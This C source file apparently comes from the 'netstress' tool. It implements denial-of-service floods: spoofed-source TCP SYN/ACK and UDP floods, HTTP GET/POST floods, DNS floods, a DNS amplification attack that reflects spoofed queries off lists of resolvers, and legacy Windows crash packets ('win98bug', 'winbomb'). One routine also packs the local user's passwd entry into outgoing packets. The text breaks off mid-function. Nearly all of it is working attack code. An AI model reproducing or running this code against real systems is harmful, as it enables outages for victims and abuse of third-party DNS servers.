/*
 * Metin KAYA <kayameti@gmail.com>
 * 2010.07.13, Istanbul
 *
 * http://www.EnderUNIX.org
 */

#include <errno.h>
#include <fcntl.h>
#include <pwd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <net/ethernet.h>

#include <netinet/igmp.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#include "compat.h"
#include "netstress.h"
#include "mkstring.h"
#include "utils.h"


extern int			max_port;
extern int			min_port;
extern int			numproc;
extern int			glob_udp_buf_sz;
extern int			starttime;
extern int			outcount;
extern int			glob_sock;
extern int			glob_dns_query_type;
extern int			dns_servers_loaded;
extern char			dns_packet[1024];
extern char			user_agent[128];
extern char			attack_type[16];
extern unsigned long		*dns_srv_ip;
extern struct country_subnet	**glob_country_subnet_list;
extern unsigned int		glob_country_subnet_cnt;
extern struct sockaddr_in	glob_src;
extern struct sockaddr_in	glob_dst;
extern struct udp_pseudo	pseudohead;
extern struct help_checksum	udp_chk_construct;
extern struct udp_packet	udp_packet;
extern struct tcp_packet	tcp_packet;
#ifdef PATTERN_SRC_IP
extern char			glob_src_ip[16];
extern unsigned int		glob_dot_cnt;
#endif

static int send_sock = -1;
static int recv_sock = -1;
static char http_post_str[4096];


static void
send_tcp_ack_pack(void)
{
	register int count = (sizeof(struct tcp_packet) - 20) >> 1, sum;
	register unsigned short *p = &tcp_packet.sport;
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

#ifdef RANDOM_SRC_IP
	tcp_packet.src = random();
#elif defined(PATTERN_SRC_IP)
	struct sockaddr_in sa;
	char tmp_ip[16];

	switch (glob_dot_cnt) {
	case 1:
		sprintf(tmp_ip, "%s%d", glob_src_ip, arc4_prng());
		break;
	case 2:
		sprintf(tmp_ip, "%s%d.%d", glob_src_ip, arc4_prng(), arc4_prng());
		break;
	case 3:
		sprintf(tmp_ip, "%s%d.%d.%d", glob_src_ip, arc4_prng(),
			arc4_prng(), arc4_prng());
		break;
	}
	inet_pton(AF_INET, tmp_ip, &(sa.sin_addr));
	tcp_packet.src = sa.sin_addr.s_addr;
#elif RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	tcp_packet.src = htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#endif

#ifdef RANDOM_SRC_PORT
	tcp_packet.sport = htons(1024 + (rand() % 64531));
#endif
	tcp_packet.id		= (rand() % 64531) + 1;
	tcp_packet.seq		= htonl(rand());
	tcp_packet.ack_seq	= htonl(rand());

#ifdef RANDOM_DST_PORT
	glob_dst.sin_port = htons((rand() % max_port) + min_port);
#endif

	sum = (tcp_packet.src >> 16) + (tcp_packet.src & 0xffff) + (tcp_packet.dst >> 16) +
		(tcp_packet.dst & 0xffff) + 1536 + htons(count << 1);
	while (count--)
		sum += *p++;
	sum = (sum >> 16) + (sum & 0xffff);
	tcp_packet.tcpsum = ~(sum += (sum >> 16));

	sendto(glob_sock, &tcp_packet, sizeof(tcp_packet), 0, (const struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr_in));
	outcount++;
}

static int org_count = (sizeof(struct tcp_packet) - 20) >> 1;

static void
send_tcp_pack(void)
{
	register int			count	= org_count, sum;
	register unsigned short	*p		= &tcp_packet.sport;
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int			idx;
#endif

#ifdef RANDOM_SRC_IP
	tcp_packet.src = random();
#elif defined(PATTERN_SRC_IP)
	struct sockaddr_in sa;
	char tmp_ip[16];

	switch (glob_dot_cnt) {
	case 1:
		sprintf(tmp_ip, "%s%d", glob_src_ip, arc4_prng());
		break;
	case 2:
		sprintf(tmp_ip, "%s%d.%d", glob_src_ip, arc4_prng(), arc4_prng());
		break;
	case 3:
		sprintf(tmp_ip, "%s%d.%d.%d", glob_src_ip, arc4_prng(), arc4_prng(),
				arc4_prng());
		break;
	}
	inet_pton(AF_INET, tmp_ip, &(sa.sin_addr));
	tcp_packet.src = sa.sin_addr.s_addr;
#elif RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	tcp_packet.src = htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
							(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#endif

#ifdef RANDOM_SRC_PORT
	tcp_packet.sport = htons(1024 + (rand() % 64531));
#endif
	tcp_packet.id		= (rand() % 64531) + 1;
	tcp_packet.seq		= rand();

#ifdef RANDOM_DST_PORT
	glob_dst.sin_port = htons((rand() % max_port) + min_port);
#endif

	tcp_packet.tcpsum = 0x0;
	sum =   (tcp_packet.src >> 16) + (tcp_packet.src & 0xffff) +
			(tcp_packet.dst >> 16) + (tcp_packet.dst & 0xffff) + 1536 +
			htons(count << 1);
	while (count--) sum += *p++;
	sum = (sum >> 16) + (sum & 0xffff);
	tcp_packet.tcpsum = ~(sum += (sum >> 16));

	sendto(glob_sock, &tcp_packet, sizeof(tcp_packet), 0, (const struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr_in));

	outcount++;
}


static void
send_iss_tcp_pack(void)
{
	register int i;
	register int count = (sizeof(struct tcp_packet) - 20) >> 1, sum;
	register unsigned short *p = &tcp_packet.sport;
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

#ifdef RANDOM_SRC_IP
	tcp_packet.src = random();
#elif defined(PATTERN_SRC_IP)
	struct sockaddr_in sa;
	char tmp_ip[16];

	switch (glob_dot_cnt) {
	case 1:
		sprintf(tmp_ip, "%s%d", glob_src_ip, arc4_prng());
		break;
	case 2:
		sprintf(tmp_ip, "%s%d.%d", glob_src_ip, arc4_prng(), arc4_prng());
		break;
	case 3:
		sprintf(tmp_ip, "%s%d.%d.%d", glob_src_ip, arc4_prng(),
			arc4_prng(), arc4_prng());
		break;
	}
	inet_pton(AF_INET, tmp_ip, &(sa.sin_addr));
	tcp_packet.src = sa.sin_addr.s_addr;
#elif RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	tcp_packet.src = htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#endif

#ifdef RANDOM_SRC_PORT
	tcp_packet.sport = htons(1024 + (rand() % 64531));
#endif
	tcp_packet.id		= (rand() % 64531) + 1;
	tcp_packet.seq		= rand();

	sum = (tcp_packet.src >> 16) + (tcp_packet.src & 0xffff) + (tcp_packet.dst >> 16) +
		(tcp_packet.dst & 0xffff) + 1536 + htons(count << 1);
	while (count--)
		sum += *p++;
	sum = (sum >> 16) + (sum & 0xffff);
	tcp_packet.tcpsum = ~(sum += (sum >> 16));

	sendto(glob_sock, &tcp_packet, sizeof(tcp_packet), 0,
		(const struct sockaddr *) &glob_dst, sizeof(struct sockaddr_in));
	outcount++;
	for (i = 0; i < 1000; i++, outcount++) {
#ifdef RANDOM_SRC_PORT
		tcp_packet.sport = htons(1024 + (rand() % 64531));
#endif
#ifdef RANDOM_DST_PORT
		glob_dst.sin_port = htons((rand() % max_port) + min_port);
#endif

		p	= &tcp_packet.sport;
		count	= (sizeof(struct tcp_packet) - 20) >> 1;
		sum	= (tcp_packet.src >> 16) + (tcp_packet.src & 0xffff)	+
				(tcp_packet.dst >> 16) + (tcp_packet.dst & 0xffff)	+
				1536 + htons(count << 1);
		while (count--)
			sum += *p++;
		sum = (sum >> 16) + (sum & 0xffff);
		tcp_packet.tcpsum = ~(sum += (sum >> 16));

		sendto(glob_sock, &tcp_packet, sizeof(tcp_packet), 0,
			(const struct sockaddr *) &glob_dst, sizeof(struct sockaddr_in));
	}
}


void
tcp_flood(void)
{
	int i;
	char arc4_buf[64];

#ifdef RANDOM_COUNTRY_SRC_IP
	load_country_ip();
#endif

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_TCP);
			srandom(time(NULL) ^ getpid());
			sprintf(arc4_buf, "mk%d@!", getpid());
			arc4_set_key((unsigned char *) arc4_buf, sizeof(arc4_buf));
			starttime = time(NULL);
			if (tcp_packet.flags == 0x10) {
				for (; ;)	send_tcp_ack_pack();
			} else if (!strcasecmp(attack_type, "ISSSYN")) {
				for (; ;)	send_iss_tcp_pack();
			} else {
				for (; ;)	send_tcp_pack();
			}

			/* NOTREACHED */
			exit(0);
		}
	}
}

u_char gram[38] = { 0x45, 0x00, 0x00, 0x26, 0x12, 0x34, 0x00, 0x00, 0xFF, 0x11,
					0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x00, 0x12, 0x00,
					0x00, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0' };

static void
send_udp_pack(void)
{
	struct sockaddr_in *p;
	struct sockaddr sa;

#ifdef RANDOM_SRC_IP
	glob_src.sin_addr.s_addr = random();
#elif defined(PATTERN_SRC_IP)
	struct sockaddr_in sa2;
	char tmp_ip[16];

	switch (glob_dot_cnt) {
	case 1:
		sprintf(tmp_ip, "%s%d", glob_src_ip, arc4_prng());
		break;
	case 2:
		sprintf(tmp_ip, "%s%d.%d", glob_src_ip, arc4_prng(), arc4_prng());
		break;
	case 3:
		sprintf(tmp_ip, "%s%d.%d.%d", glob_src_ip, arc4_prng(),
			arc4_prng(), arc4_prng());
		break;
	}
	inet_pton(AF_INET, tmp_ip, &(sa2.sin_addr));
	glob_src.sin_addr.s_addr = sa2.sin_addr.s_addr;
#elif RANDOM_COUNTRY_SRC_IP
	unsigned int idx = rand() % glob_country_subnet_cnt;
	glob_src.sin_addr.s_addr = htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#endif

#ifdef RANDOM_SRC_PORT
	glob_src.sin_port = htons(1024 + (rand() % 64531));
#endif

#ifdef RANDOM_DST_PORT
	glob_dst.sin_port = htons((rand() % max_port) + min_port);
#endif

	memcpy(gram + 12, (char *) &glob_src.sin_addr.s_addr, 4);
	memcpy(gram + 16, (char *) &glob_dst.sin_addr.s_addr, 4);
	*(u_short *) (gram + 20) = glob_src.sin_port;
	*(u_short *) (gram + 22) = glob_dst.sin_port;

	p = (struct sockaddr_in *) &sa;
	p->sin_family = AF_INET;
	memcpy(&p->sin_addr, (char *) &glob_dst.sin_addr.s_addr, sizeof(struct in_addr));
	sendto(glob_sock, &gram, sizeof(gram), 0, (struct sockaddr *) p, sizeof(struct sockaddr_in));

	outcount++;
}


static void
send_udp_buf(void)
{
	struct udp_pseudo *pseudohdr;
	u_char pseudobuff[sizeof(struct udp_pseudo) + UDPHDRSIZ + glob_udp_buf_sz];
	char buf[sizeof(udp_packet) + glob_udp_buf_sz];
	struct udphdr *udp = (struct udphdr *) (buf + IPHDRSIZ);
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

#ifdef RANDOM_SRC_IP
	udp_packet.ip.SADDR = random();
	udp_packet.ip.IPSUM = in_cksum((u_short *) &udp_packet.ip, IPHDRSIZ);
#elif defined(PATTERN_SRC_IP)
	struct sockaddr_in sa;
	char tmp_ip[16];

	switch (glob_dot_cnt) {
	case 1:
		sprintf(tmp_ip, "%s%d", glob_src_ip, arc4_prng());
		break;
	case 2:
		sprintf(tmp_ip, "%s%d.%d", glob_src_ip, arc4_prng(), arc4_prng());
		break;
	case 3:
		sprintf(tmp_ip, "%s%d.%d.%d", glob_src_ip, arc4_prng(),
			arc4_prng(), arc4_prng());
		break;
	}
	inet_pton(AF_INET, tmp_ip, &(sa.sin_addr));
	udp_packet.ip.SADDR	= sa.sin_addr.s_addr;
	udp_packet.ip.IPSUM	= in_cksum((u_short *) &udp_packet.ip, IPHDRSIZ);
#elif RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	udp_packet.ip.SADDR	= htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
	udp_packet.ip.IPSUM	= in_cksum((u_short *) &udp_packet.ip, IPHDRSIZ);
#endif
#ifdef RANDOM_SRC_PORT
	udp_packet.udp.UHSPORT	= htons(1024 + (rand() % 64531));
#endif

#ifdef RANDOM_DST_PORT
	glob_dst.sin_port = htons((rand() % max_port) + min_port);
#endif

	udp_packet.udp.UHLEN = htons(UDPHDRSIZ + glob_udp_buf_sz);
	memcpy(buf, &udp_packet, sizeof(udp_packet));
	snprintf(buf + sizeof(udp_packet), glob_udp_buf_sz, "%d", rand());

	pseudohdr = (struct udp_pseudo *) pseudobuff;
	pseudohdr->src_addr	= udp_packet.ip.SADDR;
	pseudohdr->dst_addr	= udp_packet.ip.DADDR;
	pseudohdr->dummy	= 0;
	pseudohdr->proto	= IPPROTO_UDP;
	pseudohdr->length	= udp_packet.udp.UHLEN;
	memcpy(pseudobuff + sizeof(struct udp_pseudo), buf + IPHDRSIZ,
		UDPHDRSIZ + glob_udp_buf_sz);
	udp_packet.udp.UHSUM = in_cksum((u_short *) pseudobuff,
			sizeof(struct udp_pseudo) + UDPHDRSIZ + glob_udp_buf_sz);
	udp->UHSUM = udp_packet.udp.UHSUM;

	sendto(glob_sock, buf, sizeof(udp_packet) + glob_udp_buf_sz, 0,
		(const struct sockaddr *) &glob_dst, sizeof(struct sockaddr_in));

	outcount++;
}


void
udp_flood(void)
{
	int i;
	char arc4_buf[64];

#ifdef RANDOM_COUNTRY_SRC_IP
	load_country_ip();
#endif

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_RAW);
			srandom(time(NULL) ^ getpid());
			sprintf(arc4_buf, "mk%d@!", getpid());
			arc4_set_key((unsigned char *) arc4_buf, sizeof(arc4_buf));
			starttime = time(NULL);
			if (glob_udp_buf_sz) {
				for (; ;)	send_udp_buf();
			} else {
				for (; ;)	send_udp_pack();
			}

			/* NOTREACHED */
			exit(0);
		}
	}
}

#ifdef RANDOM_URL
static void
send_http_get(void)
{
	int sock;
	int ret, comp;
	int reqlen;
	char *p;
	char reqbuf[512];

	sock = socket(AF_INET, SOCK_STREAM, 0);
	connect(sock, (struct sockaddr *) &glob_dst, sizeof(struct sockaddr));

	reqlen = snprintf(reqbuf, sizeof(reqbuf) - 1,
		"GET /%d HTTP/1.1\r\n"
		"User-Agent: %s\r\n"
		"Host: %s\r\n"
		"Connection: keep-alive\r\n\r\n",
		rand(), user_agent, HTTP_GET_HOST);

	p = reqbuf;
	comp = reqlen;
	while (comp) {
	retry_send:
		ret = send(sock, p, comp, 0);
		if (ret == 0 || (ret == -1 && errno == EWOULDBLOCK)) {
			//printf("\e[01;37m[%d] send success\e[0m\n", outcount);
            outcount++;
			goto out;
		}
		if (ret == -1 && errno == EINTR) {
			//printf("\033[0;30;43m[%d] send retry\e[0m\n", outcount);
			goto retry_send;
		} else if (ret == -1) {
            //NS_ERR("[%d] send failed (%d: %s)", i, errno, strerror(errno));
			goto out;
		}
		//printf("\033[0;30;43m[%d] send cont\e[0m\n", outcount);
		comp -= ret;
		p += ret;
	}

	outcount++;

out:
	close(sock);
}


void
http_get_flood(void)
{
	int i;

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			srandom(time(NULL) ^ getpid());
			starttime = time(NULL);
			for (; ;)	send_http_get();
			/* NOTREACHED */
			exit(0);
		}
	}
}

#else
static int reqlen = 0;
static char reqbuf[512] = { '\0' };


static void
send_http_get(void)
{
	int sock;
	int ret, comp;
	char *p;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	connect(sock, (struct sockaddr *) &glob_dst, sizeof(struct sockaddr));

	p = reqbuf;
	comp = reqlen;
	while (comp) {
	retry_send:
		ret = send(sock, p, comp, 0);
		if (ret == 0 || (ret == -1 && errno == EWOULDBLOCK)) {
			//printf("\e[01;37m[%d] send success\e[0m\n", outcount);
			outcount++;
			goto out;
		}

		if (ret == -1 && errno == EINTR) {
			//printf("\033[0;30;43m[%d] send retry\e[0m\n", outcount);
			goto retry_send;
		} else if (ret == -1) {
			//NS_ERR("[%d] send failed (%d: %s)", i, errno, strerror(errno));
			goto out;
		}
		//printf("\033[0;30;43m[%d] send cont\e[0m\n", outcount);
		comp -= ret;
		p += ret;
	}

	//printf("\e[01;37m[%d] recv success\e[0m\n", outcount);
	outcount++;

out:
	close(sock);
}


void
http_get_flood(void)
{
	int i;

	reqlen = snprintf(reqbuf, sizeof(reqbuf) - 1,
		"GET %s HTTP/1.1\r\n"
		"User-Agent: %s\r\n"
		"Host: %s\r\n"
		"Connection: keep-alive\r\n\r\n",
		STATIC_URL, user_agent, HTTP_GET_HOST);

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			starttime = time(NULL);
			for (; ;)	send_http_get();
			/* NOTREACHED */
			exit(0);
		}
	}
}
#endif


static void
send_http_post(void)
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	connect(sock, (struct sockaddr *) &glob_dst, sizeof(struct sockaddr));
	write(sock, http_post_str, strlen(http_post_str));
	close(sock);
}


void
http_post_flood(void)
{
	int i;
	char *host = "www.google.com";
	char *page = "/test.php";
	char poststr[512] = { '\0' };

	snprintf(poststr, sizeof(poststr) - 1, "a=%s&b=%s\r\n", "deneme", "test");
	snprintf(http_post_str, sizeof(http_post_str) - 1,
		 "POST %s HTTP/1.0\r\n"
		 "Host: %s\r\n"
		 "Content-type: application/x-www-form-urlencoded\r\n"
		 "Content-length: %zd\r\n\r\n"
		 "%s", page, host, strlen(poststr), poststr);

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			starttime = time(NULL);
			for (; ;)   send_http_post();
			/* NOTREACHED */
			exit(0);
		}
	}
}

static void
send_dns_pack(unsigned datasize)
{
	IPHDR *ip;
	struct udphdr *udp;
	unsigned char *data;
	unsigned char packet[4024] = { '\0' };
	char dummypacket[sizeof(struct help_checksum) + 512] = { '\0' };
#ifdef PATTERN_SRC_IP
	struct sockaddr_in sa;
	char tmp_ip[16];
#endif
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

	ip		= (IPHDR *) packet;
	udp		= (struct udphdr *) (packet + IPHDRSIZ);
	data		= (unsigned char *) (packet + IPHDRSIZ + UDPHDRSIZ);

	udp->UHSPORT	= htons(1337 + (arc4_prng() % 151));
	udp->UHDPORT	= glob_dst.sin_port;
	udp->UHLEN		= htons(UDPHDRSIZ + datasize);

#ifdef RANDOM_SRC_IP
	pseudohead.src_addr = random();
#elif defined(PATTERN_SRC_IP)
	switch (glob_dot_cnt) {
	case 1:
		sprintf(tmp_ip, "%s%d", glob_src_ip, arc4_prng());
		break;
	case 2:
		sprintf(tmp_ip, "%s%d.%d", glob_src_ip, arc4_prng(), arc4_prng());
		break;
	case 3:
		sprintf(tmp_ip, "%s%d.%d.%d", glob_src_ip, arc4_prng(),
			arc4_prng(), arc4_prng());
		break;
	}
	inet_pton(AF_INET, tmp_ip, &(sa.sin_addr));
	pseudohead.src_addr = sa.sin_addr.s_addr;
#elif defined(STATIC_SRC_IP)
	pseudohead.src_addr = glob_src.sin_addr.s_addr;
#elif RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	pseudohead.src_addr = htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#endif

	pseudohead.dst_addr	= glob_dst.sin_addr.s_addr;
	pseudohead.proto	= IPPROTO_UDP;
	pseudohead.length	= htons(UDPHDRSIZ + datasize);

	udp_chk_construct.pshd	= pseudohead;
	udp_chk_construct.udphd	= *udp;

	memcpy(&dummypacket, &udp_chk_construct, sizeof(struct help_checksum));
	memcpy(dummypacket + sizeof(struct help_checksum), dns_packet, datasize);
	udp->UHSUM = in_cksum((u_short *) dummypacket,
				sizeof(struct help_checksum) + datasize);
	memcpy(data, dns_packet, datasize);

	ip->SADDR	= pseudohead.src_addr;
	ip->DADDR	= glob_dst.sin_addr.s_addr;
	ip->VER		= 4;
	ip->HL		= 5;
	ip->TTL		= 64;
	ip->PROTO	= IPPROTO_UDP;
	ip->LEN		= htons(IPHDRSIZ + UDPHDRSIZ + datasize);
	ip->IPSUM	= in_cksum((u_short *) ip, IPHDRSIZ);

	sendto(glob_sock, packet, IPHDRSIZ + UDPHDRSIZ + datasize, 0,
			(struct sockaddr *) &glob_dst, sizeof(struct sockaddr));
	outcount++;
}


void
dns_flood(void)
{
	int i;
	char *data;
	char *p;
	char bungle[32];
	char arc4_buf[64];
	char elem[128];
	struct dnshdr *dns;

#ifdef RANDOM_COUNTRY_SRC_IP
	load_country_ip();
#endif

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_RAW);
			srandom(time(NULL) ^ getpid());
			sprintf(arc4_buf, "mk%d@!", getpid());
			arc4_set_key((unsigned char *) arc4_buf, sizeof(arc4_buf));
			starttime = time(NULL);
			for (; ;) {
				memset(&dns_packet, 0x0, sizeof(dns_packet));
				dns				= (struct dnshdr *) dns_packet;
				data			= dns_packet + DNSHDRSIZ;
				dns->rd			= 1;
				dns->que_num	= htons(1);
				dns->id			= 6000 + (arc4_prng() % 151);

				sprintf(bungle, "mk%d.net", rand());
				p = mkstrtok(bungle, ".");
				while (p != NULL) {
					sprintf(elem, "%c%s", (int) mkstrlen(p), p);
					strcat(data, elem);
					p = mkstrtok(NULL, ".");
				}

				*((u_short *) (data + mkstrlen(data) + 1)) = glob_dns_query_type;
				*((u_short *) (data + mkstrlen(data) + 3)) = DNS_CLASS_IN;

				send_dns_pack(DNSHDRSIZ + mkstrlen(data) + 5);
			}

			/* NOTREACHED */
			exit(0);
		}
	}
}


void
load_dns_servers(const char *path)
{
	FILE *fp;
	int i;
	int line_cnt = 0;
	char addr[32];
	struct sockaddr_in sa;

	fp = fopen(path, "r");
	if (!fp)
		NS_ERR("cannot open file \"%s\"", path);

	while (fgets(addr, sizeof(addr) - 1, fp))
		line_cnt++;

	dns_srv_ip = calloc(1, line_cnt * sizeof(unsigned long));
	if (!dns_srv_ip)
		NS_ERR("calloc() failed (%d: %s)", errno, strerror(errno));

	rewind(fp);
	i = 0;
	memset(&addr, 0x0, sizeof(addr));
	while (fgets(addr, sizeof(addr), fp)) {
		addr[mkstrlen(addr) - 1] = '\0';
		inet_pton(AF_INET, addr, &(sa.sin_addr));
		dns_srv_ip[i] = sa.sin_addr.s_addr;
		memset(&addr, 0x0, sizeof(addr));
		i++;
	}
	fclose(fp);

	dns_servers_loaded = 1;
}


static void
send_amp_dns_pack(unsigned datasize)
{
	IPHDR *ip;
	struct udphdr *udp;
	unsigned char *data;
	unsigned char packet[4024] = { '\0' };
	char dummypacket[sizeof(struct help_checksum) + 512] = { '\0' };
	int i;

	ip		= (IPHDR *) packet;
	udp		= (struct udphdr *) (packet + IPHDRSIZ);
	data		= (unsigned char *) (packet + IPHDRSIZ + UDPHDRSIZ);

	udp->UHSPORT	= htons(1337 + (arc4_prng() % 151));
	udp->UHDPORT	= glob_dst.sin_port = htons(53);
	udp->UHLEN		= htons(UDPHDRSIZ + datasize);

	pseudohead.src_addr	= glob_src.sin_addr.s_addr;
	pseudohead.proto	= IPPROTO_UDP;
	pseudohead.length	= htons(UDPHDRSIZ + datasize);

	udp_chk_construct.pshd	= pseudohead;
	udp_chk_construct.udphd	= *udp;

	memcpy(&dummypacket, &udp_chk_construct, sizeof(struct help_checksum));
	memcpy(dummypacket + sizeof(struct help_checksum), dns_packet, datasize);
	memcpy(data, dns_packet, datasize);

	ip->SADDR	= pseudohead.src_addr;
	ip->VER		= 4;
	ip->HL		= 5;
	ip->TTL		= 64;
	ip->PROTO	= IPPROTO_UDP;
	ip->LEN		= htons(IPHDRSIZ + UDPHDRSIZ + datasize);

	for (i = 0; dns_srv_ip[i]; i++) {
		pseudohead.dst_addr = dns_srv_ip[i];
		glob_dst.sin_addr.s_addr = dns_srv_ip[i];
		udp->UHSUM = in_cksum((u_short *) dummypacket,
					sizeof(struct help_checksum) + datasize);
		ip->DADDR = dns_srv_ip[i];
		ip->IPSUM = in_cksum((u_short *) ip, IPHDRSIZ);
	
		sendto(glob_sock, packet, IPHDRSIZ + UDPHDRSIZ + datasize, 0,
				(struct sockaddr *) &glob_dst, sizeof(struct sockaddr));
		outcount++;
	}
}


void
amp_dns_flood(char *qname)
{
	int i;
	char *data;
	char *p;
	char bungle[256];
	char arc4_buf[64];
	char elem[128];
	struct dnshdr *dns;

	for (i = 0; i < numproc; i++) {
		if (!fork()) {
			get_sock(&glob_sock, IPPROTO_RAW);
			srandom(time(NULL) ^ getpid());
			sprintf(arc4_buf, "mk%d@!", getpid());
			arc4_set_key((unsigned char *) arc4_buf, sizeof(arc4_buf));
			starttime = time(NULL);
			for (; ;) {
				memset(&dns_packet, 0x0, sizeof(dns_packet));
				dns				= (struct dnshdr *) dns_packet;
				data			= dns_packet + DNSHDRSIZ;
				dns->rd			= 1;
				dns->que_num	= htons(1);
				dns->id			= 6000 + (arc4_prng() % 151);

				mkstrcpy(bungle, qname, mkstrlen(qname) + 1);
				p = mkstrtok(bungle, ".");
				while (p != NULL) {
					sprintf(elem, "%c%s", (int) mkstrlen(p), p);
					strcat(data, elem);
					p = mkstrtok(NULL, ".");
				}

				*((u_short *) (data + mkstrlen(data) + 1)) = glob_dns_query_type;
				*((u_short *) (data + mkstrlen(data) + 3)) = DNS_CLASS_IN;

				send_amp_dns_pack(DNSHDRSIZ + mkstrlen(data) + 5);
			}

			/* NOTREACHED */
			exit(0);
		}
	}
}


static void
sendwin98bug(void)
{
	unsigned char pkt[IGMPBIGSIZ] = { '\0' };
	IPHDR *ip;
	struct igmp *igmp;
	struct utsname *un;
	struct passwd *p;
	int i;
	int id = (random() % 40000) + 500;
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

	ip = (IPHDR *) pkt;
	igmp = (struct igmp *) (pkt + IPHDRSIZ);

	ip->VER		= 4;
	ip->HL		= IPHDRSIZ / 4;
	ip->TTL		= 255;
	ip->LEN		= htons(IGMPBIGSIZ);
	ip->PROTO	= IPPROTO_IGMP;
	ip->IPID	= htons(id);
	ip->IPOFF	= htons(IP_DF);

#ifdef RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	ip->SADDR	= htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#else
	ip->SADDR	= random();
#endif

	ip->DADDR = glob_dst.sin_addr.s_addr;
	ip->IPSUM = in_cksum((unsigned short *) ip, IPHDRSIZ);

	igmp->igmp_cksum = in_cksum((unsigned short *) igmp,
					sizeof(struct igmp));

	for (i = IGMPHDRSIZ + 1; i < IGMPBIGSIZ; i++)
		pkt[i] = random() % 255;

	un = (struct utsname *)(pkt + IGMPHDRSIZ + 40);
	uname(un);
	p = (struct passwd *) ((void *) un + sizeof(struct utsname) + 10);
	memcpy(p, getpwuid(getuid()), sizeof(struct passwd));

	sendto(glob_sock, &pkt, IGMPBIGSIZ, 0, (const struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr_in));
	outcount++;

	for (i = 1; i < 5; i++) {
		if (i > 3)
			ip->IPOFF = htons(((IGMPBIGSIZ - 20) * i) >> 3);
		else
			ip->IPOFF = htons(((IGMPBIGSIZ - 20) * i) >> 3 | IP_MF);
		sendto(glob_sock, &pkt, IGMPBIGSIZ, 0, (const struct sockaddr *) &glob_dst,
			sizeof(struct sockaddr_in));
		outcount++;
	}
}


static void
send_winbomb(void)
{
	unsigned char  packet[IGMPHDRSIZ + 8] = { '\0' };
	IPHDR *ip;
	struct icmphdr *icmp;
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

	ip	= (IPHDR *) packet;
	icmp	= (struct icmphdr *) (packet + IPHDRSIZ);

	ip->HL		= 5;
	ip->VER		= 4;
	ip->IPID	= htons(1234);
	ip->IPOFF	|= htons(0x2000);
	ip->TTL		= 30;
	ip->PROTO	= IPPROTO_ICMP;
#ifdef RANDOM_COUNTRY_SRC_IP
	idx = rand() % glob_country_subnet_cnt;
	ip->SADDR	= htonl(ntohl(glob_country_subnet_list[idx]->subnet) +
				(rand() % glob_country_subnet_list[idx]->maxip) + 1);
#else
	ip->SADDR	= random();
#endif
	ip->DADDR	= glob_dst.sin_addr.s_addr;
	ip->IPSUM	= in_cksum((u_short *) ip, IPHDRSIZ);

	icmp->ICMPTYPE	= rand() % 15;
	icmp->ICMPCODE	= rand() % 15;
	icmp->ICMPSUM	= in_cksum((u_short *) icmp, sizeof(struct icmphdr) + 1);

	sendto(glob_sock, &packet, IPHDRSIZ + sizeof(struct icmphdr) + 1,
		0, (struct sockaddr *) &glob_dst, sizeof(struct sockaddr));
	outcount++;

	ip->LEN		= htons(IGMPHDRSIZ + 8);
	ip->IPOFF	= htons(8 >> 3);
	ip->IPOFF	|= htons(0x2000);
	ip->IPSUM	= in_cksum((u_short *) ip, IPHDRSIZ);
	icmp->ICMPTYPE	= rand() % 15;
	icmp->ICMPCODE	= rand() % 15;
	icmp->ICMPSUM	= 0;

	sendto(glob_sock, &packet, IGMPHDRSIZ + 8, 0, (struct sockaddr *) &glob_dst,
		sizeof(struct sockaddr));
	outcount++;
}


static void
send_igmp(void)
{
	unsigned char packet[IGMPHDRSIZ + 8] = { '\0' };
	IPHDR *ip;
	struct igmp   *igmp;
#ifdef RANDOM_COUNTRY_SRC_IP
	unsigned int idx;
#endif

	ip		= (IPHDR *) packet;
	igmp		= (struct igmp *) (packet + IPHDRSIZ);

	ip->HL	= 5;
	ip->VER	= 4;
